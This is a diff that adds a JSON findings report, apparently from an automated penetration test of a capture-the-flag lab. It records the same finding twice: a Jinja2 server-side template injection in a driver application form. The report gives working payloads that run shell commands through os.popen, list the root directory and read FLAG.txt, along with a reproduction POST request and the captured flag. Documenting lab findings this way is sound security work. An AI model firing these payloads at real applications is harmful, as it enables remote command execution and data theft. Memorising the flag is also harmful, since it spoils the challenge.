@@ -1,0 +1,41 @@
+{
+  "meta": {
+    "created": "2026-04-14T23:15:59.290012+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "f086593f-ab76-4360-9dfb-dfce50c21e34",
+      "timestamp": "2026-04-14T23:15:59.289812+00:00",
+      "title": "Server-Side Template Injection (SSTI) in Driver Application Form",
+      "severity": "critical",
+      "target": "http://172.17.0.1:46383",
+      "description": "The driver application form at /submit is vulnerable to Server-Side Template Injection (SSTI). User-supplied input in the 'name' parameter is rendered directly in a Jinja2 template without sanitization, allowing arbitrary code execution via the lipsum.__globals__['os'].popen() technique.",
+      "evidence": "Flag extracted: flag{43509ba5-dc71-4a57-b55d-96e228e4ddfe}\n\nSSTI confirmed via:\n1. {{7*7}} rendered as 49\n2. {{lipsum.__globals__['os'].popen('ls /').read()}} returned directory listing including FLAG.txt\n3. {{lipsum.__globals__['os'].popen('cat /FLAG.txt').read()}} returned the flag",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "POST /submit with body: name={{lipsum.__globals__['os'].popen('cat /FLAG.txt').read()}}&email=test@test.com&phone=1234567890&experience=5&license=ABC123",
+        "expected": "Response contains the flag: flag{43509ba5-dc71-4a57-b55d-96e228e4ddfe}"
+      }
+    },
+    {
+      "id": "f4d92f73-da3e-409e-ba04-85e27364485c",
+      "timestamp": "2026-04-14T23:15:59.366109+00:00",
+      "title": "Server-Side Template Injection (SSTI) in Driver Application Form",
+      "severity": "critical",
+      "target": "http://172.17.0.1:46383",
+      "description": "The driver application form at /submit is vulnerable to Server-Side Template Injection (SSTI). User-supplied input in the 'name' parameter is rendered directly in a Jinja2 template without sanitization, allowing arbitrary code execution via the lipsum.__globals__['os'].popen() technique.",
+      "evidence": "Flag extracted: flag{43509ba5-dc71-4a57-b55d-96e228e4ddfe}\n\nSSTI confirmed via:\n1. {{7*7}} rendered as 49\n2. {{lipsum.__globals__['os'].popen('ls /').read()}} returned directory listing including FLAG.txt\n3. {{lipsum.__globals__['os'].popen('cat /FLAG.txt').read()}} returned the flag",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "POST /submit with body: name={{lipsum.__globals__['os'].popen('cat /FLAG.txt').read()}}&email=test@test.com&phone=1234567890&experience=5&license=ABC123",
+        "expected": "Response contains the flag: flag{43509ba5-dc71-4a57-b55d-96e228e4ddfe}"
+      }
+    }
+  ],
+  "diagrams": []
+}
